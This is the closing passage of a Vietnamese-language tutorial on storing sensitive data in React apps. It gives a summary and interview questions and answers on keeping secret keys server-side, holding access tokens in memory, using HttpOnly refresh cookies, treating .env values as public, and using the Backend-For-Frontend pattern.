  │  │  □ HSTS header                                  │  │
  │  │  □ Content-Security-Policy header               │  │
  │  │  □ X-Content-Type-Options: nosniff              │  │
  │  │  □ X-Frame-Options: DENY                        │  │
  │  │  □ Referrer-Policy: no-referrer                  │  │
  │  └──────────────────────────────────────────────────┘  │
  │                                                        │
  └────────────────────────────────────────────────────────┘
```

---

## §10. Tổng Kết & Câu Hỏi Phỏng Vấn!

### 10.1. Tổng Kết!

```
  SENSITIVE DATA STORAGE — TỔNG KẾT:
  ┌────────────────────────────────────────────────────────┐
  │                                                        │
  │  NGUYÊN TẮC VÀNG:                                     │
  │  "Client-side code là PUBLIC — mọi thứ đều bị đọc!"  │
  │                                                        │
  │  ① SECRET KEYS → Server lưu, client không biết!       │
  │  ② ACCESS TOKENS → In-Memory (closure, 15 phút)!      │
  │  ③ REFRESH TOKENS → HttpOnly Cookie (7 ngày)!         │
  │  ④ PUBLIC KEYS → .env files (build-time replace)!     │
  │  ⑤ THIRD-PARTY → BFF pattern (server proxy)!          │
  │  ⑥ KHÔNG BAO GIỜ → localStorage cho tokens!           │
  │                                                        │
  └────────────────────────────────────────────────────────┘
```

### 10.2. Câu Hỏi Phỏng Vấn!

**❓ Q1: Bạn sẽ lưu API keys ở đâu trong React app?**

> **API secret keys TUYỆT ĐỐI KHÔNG lưu ở client!** React bundle là public — mọi thứ trong đó đều bị đọc được qua DevTools. Secret keys phải lưu ở server và dùng **BFF (Backend-For-Frontend) pattern**: React gọi server của mình → server thêm API key → server gọi third-party API. Chỉ **public keys** (Stripe publishable key, Google Maps key restricted by domain) mới đặt trong `.env` — nhưng phải hiểu rằng chúng vẫn là public trong bundle.

**❓ Q2: Tại sao không nên lưu JWT tokens trong localStorage?**

> localStorage dễ bị **XSS attack** — nếu app có lỗ hổng XSS, hacker inject script có thể đọc `localStorage.getItem('token')` và đánh cắp token. localStorage cũng **persistent** (tồn tại sau khi đóng browser), accessible bởi **mọi JavaScript** trên trang (kể cả third-party scripts, extensions). Thay vào đó, nên lưu access token **in-memory** (biến JS trong closure) và refresh token trong **HttpOnly cookie** (JS không đọc được).

**❓ Q3: HttpOnly cookie khác gì cookie thường?**

> Cookie thường: `document.cookie = "token=abc"` → JS **ĐỌC ĐƯỢC**, XSS đọc được. HttpOnly cookie: server set `Set-Cookie: token=abc; HttpOnly; Secure; SameSite=Strict` → JS **KHÔNG ĐỌC ĐƯỢC** (`document.cookie` trả `""`), browser **tự động** gắn vào requests, XSS **không thể** đánh cắp. Flags quan trọng: **HttpOnly** (chặn JS), **Secure** (chỉ HTTPS), **SameSite=Strict** (chống CSRF).

**❓ Q4: Giải thích access token + refresh token pattern?**

> **Access token** (15 phút, in-memory): Dùng để authenticate API requests, lưu trong biến JS closure (không localStorage), hết hạn nhanh nên nếu lộ thì damage limited. **Refresh token** (7 ngày, HttpOnly cookie): Dùng để lấy access token mới khi hết hạn, browser tự gửi qua cookie, JS không đọc được. **Flow**: Login → server trả access token (body) + set refresh cookie (HttpOnly) → access hết hạn → gọi `/refresh` endpoint → server đọc cookie → trả access mới → refresh page → tự động gọi `/refresh`.

**❓ Q5: .env file trong React có an toàn không?**

> **KHÔNG an toàn cho secrets!** `.env` chỉ là convenience, không phải security. Khi build, webpack/Vite **thay thế** `process.env.REACT_APP_*` bằng giá trị thực vào bundle.js dạng **plain text**. Ai cũng đọc được. `.env` chỉ nên dùng cho **public values**: API endpoints, public keys, feature flags, environment names. Secret keys phải lưu ở **server environment variables**, không bao giờ ở client `.env`.

**❓ Q6: BFF pattern là gì và khi nào sử dụng?**

> **BFF (Backend-For-Frontend)** là pattern dùng server trung gian giữa React client và third-party APIs. React gọi BFF → BFF thêm API keys (lưu ở server) → BFF gọi third-party API → BFF filter response → trả về React. Dùng khi: (1) Cần gọi APIs yêu cầu secret keys (Stripe, AWS...), (2) Cần filter/transform data trước khi gửi client, (3) Rate limiting, (4) Logging và monitoring. BFF giúp **tách biệt hoàn toàn** secrets khỏi client code.

**❓ Q7: Làm sao bảo vệ token khi user refresh page?**

> Access token in-memory sẽ **mất khi refresh**. Giải pháp: Kết hợp với **refresh token trong HttpOnly cookie**. Khi app khởi động → tự động gọi `POST /api/auth/refresh` → browser gửi HttpOnly cookie → server verify → trả access token mới → lưu in-memory. User **không cần login lại**. Nếu refresh token hết hạn hoặc bị invalidate → redirect về trang login.

---

> 📝 **Ghi nhớ cuối cùng:**
> "Secret keys → SERVER ONLY! Access tokens → IN-MEMORY! Refresh tokens → HttpOnly Cookie! Public keys → .env! KHÔNG BAO GIỜ localStorage cho tokens! Luôn dùng BFF pattern cho third-party API calls!"
